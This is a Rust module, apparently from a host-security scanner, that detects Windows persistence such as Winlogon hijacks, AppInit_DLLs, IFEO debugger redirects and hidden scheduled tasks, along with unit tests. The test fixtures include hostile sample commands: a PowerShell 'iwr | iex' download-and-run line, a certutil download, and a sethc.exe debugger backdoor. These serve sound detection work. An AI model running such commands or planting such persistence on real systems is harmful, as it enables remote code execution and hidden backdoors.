//! Windows persistence rules, independent of how entries are read (live
//! registry today, offline hives later), so they are tested on every
//! platform.

use std::collections::HashSet;

use warden_core::{
    Finding, FindingTarget, ObservedPath, PersistenceEntry, PersistenceMechanism, PersistenceScope,
};

use crate::heuristics::{command_indicators, snippet};
use crate::rules::{self, Rule};

/// Expands `%NAME%` references with `lookup`; unknown names stay as they are.
pub(crate) fn expand_env(s: &str, lookup: &dyn Fn(&str) -> Option<String>) -> String {
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(start) = rest.find('%') {
        out.push_str(&rest[..start]);
        let after = &rest[start + 1..];
        match after.find('%') {
            Some(end) if end > 0 && !after[..end].contains(char::is_whitespace) => {
                let name = &after[..end];
                match lookup(name) {
                    Some(v) => out.push_str(&v),
                    None => {
                        out.push('%');
                        out.push_str(name);
                        out.push('%');
                    }
                }
                rest = &after[end + 1..];
            }
            _ => {
                out.push('%');
                rest = after;
            }
        }
    }
    out.push_str(rest);
    out
}

/// Normalises a service `ImagePath`: `\SystemRoot\x`, `System32\x` and
/// `\??\C:\x` forms become ordinary paths.
pub(crate) fn normalize_image_path(p: &str, system_root: &str) -> String {
    let p = p.trim();
    let lower = p.to_ascii_lowercase();
    if let Some(rest) = p.strip_prefix(r"\??\") {
        rest.to_owned()
    } else if lower.starts_with(r"\systemroot\") {
        format!("{system_root}{}", &p[r"\SystemRoot".len()..])
    } else if lower.starts_with(r"system32\") || lower.starts_with(r"syswow64\") {
        format!(r"{system_root}\{p}")
    } else {
        p.to_owned()
    }
}

/// The file a Windows command starts: a quoted path, a path ending in
/// `.exe`, or the first token. For `rundll32` and `regsvr32` the DLL they
/// load is returned instead. Only paths with a directory are returned.
pub(crate) fn command_executable(cmd: &str) -> Option<String> {
    let cmd = cmd.trim();
    let (first, rest) = if let Some(r) = cmd.strip_prefix('"') {
        let end = r.find('"')?;
        (&r[..end], &r[end + 1..])
    } else {
        let lower = cmd.to_ascii_lowercase();
        let exe_end = lower
            .match_indices(".exe")
            .map(|(i, _)| i + 4)
            .find(|&e| lower[e..].chars().next().is_none_or(char::is_whitespace));
        let end = exe_end.unwrap_or_else(|| cmd.find(char::is_whitespace).unwrap_or(cmd.len()));
        (&cmd[..end], &cmd[end..])
    };
    let base = first
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(first)
        .to_ascii_lowercase();
    let args: Vec<&str> = rest.split_whitespace().collect();
    let chosen = match base.as_str() {
        "rundll32.exe" | "rundll32" => args.first().map(|a| {
            a.trim_matches('"')
                .split(',')
                .next()
                .unwrap_or("")
                .to_owned()
        }),
        "regsvr32.exe" | "regsvr32" => args
            .iter()
            .rev()
            .find(|a| !a.starts_with('/') && !a.starts_with('-'))
            .map(|a| a.trim_matches('"').to_owned()),
        _ => Some(first.to_owned()),
    }?;
    (chosen.contains('\\') || chosen.contains(':')).then_some(chosen)
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum Location {
    /// Temporary or shared scratch location anyone can write.
    Temp,
    /// Under C:\Users or C:\ProgramData: writable by ordinary users.
    UserWritable,
    Other,
}

pub(crate) fn classify(path: &str) -> Location {
    let p = path.replace('/', "\\").to_ascii_lowercase();
    let temp = [
        "\\temp\\",
        "\\tmp\\",
        "\\users\\public\\",
        "$recycle.bin",
        "\\perflogs\\",
        "\\windows\\tasks\\",
    ];
    if temp.iter().any(|t| p.contains(t)) {
        return Location::Temp;
    }
    let tail = p.get(1..).unwrap_or("");
    if tail.starts_with(":\\users\\") || tail.starts_with(":\\programdata\\") {
        Location::UserWritable
    } else {
        Location::Other
    }
}

/// Whether a Winlogon `Shell` or `Userinit` value differs from the default.
pub(crate) fn winlogon_modified(name: &str, value: &str, system_root: &str) -> bool {
    let v = value
        .trim()
        .trim_end_matches(',')
        .trim()
        .to_ascii_lowercase();
    match name.to_ascii_lowercase().as_str() {
        "shell" => {
            v != "explorer.exe"
                && v != format!("{}\\explorer.exe", system_root.to_ascii_lowercase())
        }
        "userinit" => {
            let sr = system_root.to_ascii_lowercase();
            v != format!("{sr}\\system32\\userinit.exe")
                && v != "%systemroot%\\system32\\userinit.exe"
                && v != "userinit.exe"
        }
        _ => false,
    }
}

/// A scheduled task, from its XML definition.
#[derive(Debug, Default, PartialEq, Eq)]
pub(crate) struct Task {
    /// Command lines (`Command` plus `Arguments`).
    pub(crate) commands: Vec<String>,
    pub(crate) com_handlers: Vec<String>,
    pub(crate) enabled: bool,
    pub(crate) hidden: bool,
    pub(crate) user: Option<String>,
}

/// Decodes a task file (UTF-16 with BOM, or UTF-8).
pub(crate) fn decode_text(bytes: &[u8]) -> String {
    let utf16 = |be: bool| {
        let units: Vec<u16> = bytes[2..]
            .as_chunks::<2>()
            .0
            .iter()
            .map(|c| {
                if be {
                    u16::from_be_bytes(*c)
                } else {
                    u16::from_le_bytes(*c)
                }
            })
            .collect();
        String::from_utf16_lossy(&units)
    };
    match bytes {
        [0xFF, 0xFE, ..] => utf16(false),
        [0xFE, 0xFF, ..] => utf16(true),
        [0xEF, 0xBB, 0xBF, rest @ ..] => String::from_utf8_lossy(rest).into_owned(),
        _ => String::from_utf8_lossy(bytes).into_owned(),
    }
}

/// Contents of `<tag>...</tag>` elements (tag with or without attributes).
fn elements<'a>(xml: &'a str, tag: &str) -> Vec<&'a str> {
    let mut out = Vec::new();
    let open = format!("<{tag}");
    let close = format!("</{tag}>");
    let mut rest = xml;
    while let Some(i) = rest.find(&open) {
        let after = &rest[i + open.len()..];
        // `<Exec>` must not match `<Execution...>`.
        if !after.starts_with(['>', ' ', '\t', '\r', '\n', '/']) {
            rest = after;
            continue;
        }
        let Some(gt) = after.find('>') else { break };
        if after[..gt].ends_with('/') {
            out.push("");
            rest = &after[gt + 1..];
            continue;
        }
        let body = &after[gt + 1..];
        let Some(end) = body.find(&close) else { break };
        out.push(&body[..end]);
        rest = &body[end + close.len()..];
        if out.len() >= 64 {
            break;
        }
    }
    out
}

fn unescape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut rest = s.trim();
    while let Some(i) = rest.find('&') {
        out.push_str(&rest[..i]);
        let after = &rest[i..];
        let Some(semi) = after.find(';').filter(|&n| n <= 10) else {
            out.push('&');
            rest = &after[1..];
            continue;
        };
        let ent = &after[1..semi];
        let ch = match ent {
            "amp" => Some('&'),
            "lt" => Some('<'),
            "gt" => Some('>'),
            "quot" => Some('"'),
            "apos" => Some('\''),
            _ => ent
                .strip_prefix("#x")
                .and_then(|h| u32::from_str_radix(h, 16).ok())
                .or_else(|| ent.strip_prefix('#').and_then(|d| d.parse().ok()))
                .and_then(char::from_u32),
        };
        match ch {
            Some(c) => out.push(c),
            None => out.push_str(&after[..=semi]),
        }
        rest = &after[semi + 1..];
    }
    out.push_str(rest);
    out
}

pub(crate) fn parse_task(xml: &str) -> Task {
    let first = |x: &str, t: &str| elements(x, t).first().map(|s| unescape(s));
    let settings = elements(xml, "Settings").first().copied().unwrap_or("");
    let mut task = Task {
        enabled: first(settings, "Enabled").is_none_or(|v| !v.eq_ignore_ascii_case("false")),
        hidden: first(settings, "Hidden").is_some_and(|v| v.eq_ignore_ascii_case("true")),
        user: elements(xml, "Principal")
            .first()
            .and_then(|p| first(p, "UserId").or_else(|| first(p, "GroupId"))),
        ..Task::default()
    };
    for exec in elements(xml, "Exec") {
        if let Some(cmd) = first(exec, "Command") {
            let args = first(exec, "Arguments").unwrap_or_default();
            task.commands.push(if args.is_empty() {
                cmd
            } else {
                format!("{cmd} {args}")
            });
        }
    }
    for h in elements(xml, "ComHandler") {
        if let Some(c) = first(h, "ClassId") {
            task.com_handlers.push(c);
        }
    }
    task
}

/// Whether a task principal is a system account.
pub(crate) fn system_principal(user: Option<&str>) -> bool {
    user.is_some_and(|u| {
        let u = u.to_ascii_lowercase();
        matches!(
            u.as_str(),
            "s-1-5-18" | "s-1-5-19" | "s-1-5-20" | "system" | "localsystem"
        ) || u.ends_with("\\system")
            || u.ends_with("\\local service")
            || u.ends_with("\\network service")
    })
}

/// One Windows persistence entry, as read.
#[derive(Clone, Debug)]
pub(crate) struct WinEntry {
    pub(crate) mechanism: PersistenceMechanism,
    pub(crate) scope: PersistenceScope,
    /// Registry value or file that defines it.
    pub(crate) location: String,
    /// Command with environment variables already expanded.
    pub(crate) command: Option<String>,
    pub(crate) enabled: Option<bool>,
    pub(crate) detail: Option<String>,
    pub(crate) hidden: bool,
}

/// Applies the rules to Windows entries and collects results.
#[derive(Debug, Default)]
pub(crate) struct Collector {
    pub(crate) findings: Vec<Finding>,
    pub(crate) persistence: Vec<PersistenceEntry>,
    seen: HashSet<(String, String, String)>,
}

impl Collector {
    pub(crate) fn report(
        &mut self,
        rule: &Rule,
        mechanism: PersistenceMechanism,
        location: &str,
        entry: Option<&str>,
        summary: String,
    ) {
        let key = (
            rule.id.to_owned(),
            location.to_owned(),
            entry.unwrap_or("").to_owned(),
        );
        if self.seen.insert(key) {
            self.findings.push(rule.finding(
                FindingTarget::Persistence {
                    mechanism,
                    location: ObservedPath {
                        text: location.to_owned(),
                        raw_hex: None,
                    },
                    entry: entry.map(snippet),
                },
                summary,
            ));
        }
    }

    /// A Winlogon value (`Shell`, `Userinit`, `Taskman`, `AppSetup`).
    pub(crate) fn winlogon_value(
        &mut self,
        location: String,
        name: &str,
        value: &str,
        expanded: String,
        system_root: &str,
    ) {
        let modified = match name {
            "Shell" | "Userinit" => winlogon_modified(name, value, system_root),
            _ => !value.trim().is_empty(),
        };
        if modified {
            self.report(
                &rules::WINLOGON_MODIFIED,
                PersistenceMechanism::Winlogon,
                &location,
                Some(value),
                format!("{name} = {value}"),
            );
        }
        self.record(WinEntry {
            mechanism: PersistenceMechanism::Winlogon,
            scope: PersistenceScope::System,
            location,
            command: Some(expanded),
            enabled: Some(true),
            detail: Some(format!("Winlogon {name}")),
            hidden: false,
        });
    }

    /// `AppInit_DLLs` with its `LoadAppInit_DLLs` switch.
    pub(crate) fn appinit(&mut self, location: String, dlls: &str, load: u32, expanded: String) {
        if dlls.trim().is_empty() {
            return;
        }
        if load == 1 {
            self.report(
                &rules::APPINIT_DLLS,
                PersistenceMechanism::Winlogon,
                &location,
                Some(dlls),
                format!("AppInit_DLLs = {dlls}"),
            );
        }
        self.record(WinEntry {
            mechanism: PersistenceMechanism::Winlogon,
            scope: PersistenceScope::System,
            location,
            command: Some(expanded),
            enabled: Some(load == 1),
            detail: Some("AppInit_DLLs".into()),
            hidden: false,
        });
    }

    /// An Image File Execution Options `Debugger` or SilentProcessExit
    /// `MonitorProcess` for `image`.
    pub(crate) fn launch_redirect(
        &mut self,
        location: String,
        image: &str,
        value_name: &str,
        cmd: &str,
        expanded: String,
    ) {
        self.report(
            &rules::IFEO_DEBUGGER,
            PersistenceMechanism::Winlogon,
            &location,
            Some(cmd),
            format!("{image}: {value_name} = {cmd}"),
        );
        self.record(WinEntry {
            mechanism: PersistenceMechanism::Winlogon,
            scope: PersistenceScope::System,
            location,
            command: Some(expanded),
            enabled: Some(true),
            detail: Some(format!("runs when {image} starts or exits")),
            hidden: false,
        });
    }

    pub(crate) fn record(&mut self, e: WinEntry) {
        let mut executable = None;
        if let Some(cmd) = &e.command {
            for (rule, matched) in command_indicators(cmd) {
                self.report(
                    rule,
                    e.mechanism,
                    &e.location,
                    Some(cmd),
                    format!("matched: {matched}"),
                );
            }
            executable = command_executable(cmd);
            if let Some(exe) = &executable {
                match classify(exe) {
                    Location::Temp => self.report(
                        &rules::TEMP_EXEC,
                        e.mechanism,
                        &e.location,
                        Some(cmd),
                        format!("starts {exe}"),
                    ),
                    Location::UserWritable if e.scope == PersistenceScope::System => self.report(
                        &rules::SYSTEM_USER_WRITABLE,
                        e.mechanism,
                        &e.location,
                        Some(cmd),
                        format!("starts {exe}"),
                    ),
                    _ => {}
                }
            }
        }
        if e.hidden {
            self.report(
                &rules::HIDDEN_TASK,
                e.mechanism,
                &e.location,
                e.command.as_deref(),
                "task is hidden".into(),
            );
        }
        self.persistence.push(PersistenceEntry {
            mechanism: e.mechanism,
            scope: e.scope,
            location: ObservedPath {
                text: e.location,
                raw_hex: None,
            },
            command: e.command.map(|c| snippet(&c)),
            executable: executable.map(|x| ObservedPath {
                text: x,
                raw_hex: None,
            }),
            enabled: e.enabled,
            detail: e.detail,
        });
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn env(name: &str) -> Option<String> {
        match name.to_ascii_lowercase().as_str() {
            "systemroot" => Some(r"C:\Windows".into()),
            "appdata" => Some(r"C:\Users\a\AppData\Roaming".into()),
            _ => None,
        }
    }

    #[test]
    fn expands_environment() {
        assert_eq!(
            expand_env(r"%SystemRoot%\x.exe %1 %UNKNOWN% 50%", &env),
            r"C:\Windows\x.exe %1 %UNKNOWN% 50%"
        );
        assert_eq!(
            expand_env("%AppData%\\a", &env),
            r"C:\Users\a\AppData\Roaming\a"
        );
    }

    #[test]
    fn normalizes_image_paths() {
        assert_eq!(
            normalize_image_path(r"\SystemRoot\System32\drivers\x.sys", r"C:\Windows"),
            r"C:\Windows\System32\drivers\x.sys"
        );
        assert_eq!(
            normalize_image_path(r"System32\drivers\y.sys", r"C:\Windows"),
            r"C:\Windows\System32\drivers\y.sys"
        );
        assert_eq!(
            normalize_image_path(r"\??\C:\x\z.sys", r"C:\Windows"),
            r"C:\x\z.sys"
        );
    }

    #[test]
    fn finds_executables() {
        assert_eq!(
            command_executable(r#""C:\Program Files\A\a.exe" -x"#).as_deref(),
            Some(r"C:\Program Files\A\a.exe")
        );
        assert_eq!(
            command_executable(r"C:\Program Files\A\a.exe -x").as_deref(),
            Some(r"C:\Program Files\A\a.exe")
        );
        assert_eq!(
            command_executable(r"C:\x\run.bat arg").as_deref(),
            Some(r"C:\x\run.bat")
        );
        assert_eq!(
            command_executable(r"rundll32.exe C:\Users\a\x.dll,Start").as_deref(),
            Some(r"C:\Users\a\x.dll")
        );
        assert_eq!(
            command_executable(r#"regsvr32 /s "C:\ProgramData\y.dll""#).as_deref(),
            Some(r"C:\ProgramData\y.dll")
        );
        assert_eq!(command_executable("notepad.exe"), None);
        assert_eq!(command_executable("\"unterminated"), None);
    }

    #[test]
    fn classifies_locations() {
        assert_eq!(
            classify(r"C:\Users\a\AppData\Local\Temp\x.exe"),
            Location::Temp
        );
        assert_eq!(classify(r"C:\Users\Public\x.exe"), Location::Temp);
        assert_eq!(classify(r"C:\Windows\Temp\x.exe"), Location::Temp);
        assert_eq!(
            classify(r"C:\Users\a\AppData\Roaming\x.exe"),
            Location::UserWritable
        );
        assert_eq!(classify(r"D:\ProgramData\V\x.exe"), Location::UserWritable);
        assert_eq!(classify(r"C:\Program Files\V\x.exe"), Location::Other);
    }

    #[test]
    fn winlogon_defaults() {
        assert!(!winlogon_modified("Shell", "explorer.exe", r"C:\Windows"));
        assert!(winlogon_modified(
            "Shell",
            "explorer.exe, C:\\x\\evil.exe",
            r"C:\Windows"
        ));
        assert!(!winlogon_modified(
            "Userinit",
            r"C:\Windows\system32\userinit.exe,",
            r"C:\Windows"
        ));
        assert!(winlogon_modified(
            "Userinit",
            r"C:\Windows\system32\userinit.exe,C:\x.exe,",
            r"C:\Windows"
        ));
    }

    #[test]
    fn parses_task_xml() {
        let xml = r#"<?xml version="1.0" encoding="UTF-16"?>
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Principals><Principal id="Author"><UserId>S-1-5-18</UserId></Principal></Principals>
  <Settings><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
  <Actions Context="Author">
    <Exec><Command>powershell.exe</Command><Arguments>-c &quot;iwr http://x/a | iex&quot;</Arguments></Exec>
    <Exec><Command>C:\a.exe</Command></Exec>
    <ComHandler><ClassId>{0000-1111}</ClassId></ComHandler>
  </Actions>
</Task>"#;
        let mut bytes = vec![0xFF, 0xFE];
        bytes.extend(xml.encode_utf16().flat_map(u16::to_le_bytes));
        let t = parse_task(&decode_text(&bytes));
        assert_eq!(
            t.commands,
            [r#"powershell.exe -c "iwr http://x/a | iex""#, r"C:\a.exe"]
        );
        assert_eq!(t.com_handlers, ["{0000-1111}"]);
        assert!(t.enabled && t.hidden);
        assert!(system_principal(t.user.as_deref()));
        assert!(!parse_task("<Task><Settings><Enabled>false</Enabled></Settings></Task>").enabled);
        assert_eq!(unescape("a &amp;&#65;&#x42; &bogus; &"), "a &AB &bogus; &");
    }

    #[test]
    fn collector_applies_rules() {
        let mut c = Collector::default();
        let entry = |scope, command: &str, hidden| WinEntry {
            mechanism: PersistenceMechanism::ScheduledTask,
            scope,
            location: r"C:\Windows\System32\Tasks\T".into(),
            command: Some(command.into()),
            enabled: Some(true),
            detail: None,
            hidden,
        };
        c.record(entry(
            PersistenceScope::System,
            r"C:\ProgramData\u\up.exe",
            true,
        ));
        c.record(entry(
            PersistenceScope::User,
            r"C:\Users\a\AppData\Local\Temp\x.exe",
            false,
        ));
        c.record(entry(
            PersistenceScope::User,
            r"C:\Users\a\AppData\Roaming\ok.exe",
            false,
        ));
        c.record(entry(
            PersistenceScope::System,
            r"certutil -urlcache -f http://x/a C:\a.exe",
            false,
        ));
        let mut ids: Vec<_> = c
            .findings
            .iter()
            .filter_map(|f| f.source.rule_id.as_deref())
            .collect();
        ids.sort_unstable();
        assert_eq!(
            ids,
            ["AW-SYS-001", "AW-SYS-002", "AW-SYS-024", "AW-SYS-025"]
        );
        assert_eq!(c.persistence.len(), 4);
    }

    #[test]
    fn winlogon_appinit_and_ifeo() {
        let mut c = Collector::default();
        c.winlogon_value(
            "W\\Shell".into(),
            "Shell",
            "explorer.exe",
            "explorer.exe".into(),
            r"C:\Windows",
        );
        c.winlogon_value(
            "W\\Userinit".into(),
            "Userinit",
            r"C:\Windows\system32\userinit.exe,C:\x.exe",
            String::new(),
            r"C:\Windows",
        );
        c.appinit("A1".into(), "", 1, String::new());
        c.appinit("A2".into(), r"C:\x.dll", 0, r"C:\x.dll".into());
        c.appinit("A3".into(), r"C:\y.dll", 1, r"C:\y.dll".into());
        c.launch_redirect(
            "I".into(),
            "sethc.exe",
            "Debugger",
            "cmd.exe",
            "cmd.exe".into(),
        );
        let hits: Vec<(&str, &str)> = c
            .findings
            .iter()
            .filter_map(|f| Some((f.source.rule_id.as_deref()?, f.target.path()?.text.as_str())))
            .collect();
        assert_eq!(
            hits,
            [
                ("AW-SYS-022", "W\\Userinit"),
                ("AW-SYS-023", "A3"),
                ("AW-SYS-021", "I")
            ]
        );
        // Empty AppInit_DLLs is not an entry; disabled ones are listed.
        assert_eq!(c.persistence.len(), 5);
    }
}
